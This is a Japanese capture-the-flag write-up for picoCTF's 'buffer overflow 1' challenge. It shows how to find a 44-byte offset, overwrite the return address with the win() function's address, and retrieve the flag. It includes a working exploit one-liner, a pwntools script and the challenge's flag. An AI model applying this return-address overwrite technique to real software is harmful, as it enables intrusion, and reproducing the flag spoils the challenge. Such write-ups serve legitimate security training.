# buffer overflow 1:Binary Exploitation

Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the [program](). You can view source [here](). And connect with it using `nc saturn.picoctf.net 53578`

# Solution

とりあえず、`nc saturn.picoctf.net 53578`を実行してみる。
```
$ nc saturn.picoctf.net 53578
Please enter your string: 
abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz
Okay, time to return... Fingers Crossed... Jumping to 0x76757473
```
入力した文字の一部が出てきた。おそらく、`44文字+4文字(リトルエンディアン)`で何かするとフラグが出てきそうだ。
vlun.cを見てみると、
```c
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
```
flag.txtを読み込んでいるwin関数を発見。この関数のアドレス値を+4文字の部分に入れる。アドレス値は`0x080491f6`。アドレス値は、readelfで探すか逆アセンブルして探す。
```
63: 080491f6   139 FUNC    GLOBAL DEFAULT   13 win)
```
```  
                     win                                             XREF[3]:     Entry Point (*) , 0804a0e0 , 
                                                                                          0804a17c (*)   
080491f6 f3  0f  1e  fb    ENDBR32
```
`(python3 -c 'import sys; sys.stdout.write("a"*44)'; echo -e '\xf6\x91\x04\x08') | nc saturn.picoctf.net 53578`を実行する。

```
$ (python3 -c 'import sys; sys.stdout.write("a"*44)'; echo -e '\xf6\x91\x04\x08') | nc saturn.picoctf.net 53578
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}
```
フラグが得られた。

`picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}`

以下、実行コード。
```python
from pwn import *

p = remote("saturn.picoctf.net", 53578)

payload = b"a"*44
payload += p32(0x080491f6)

p.sendline(payload)

p.interactive()
```

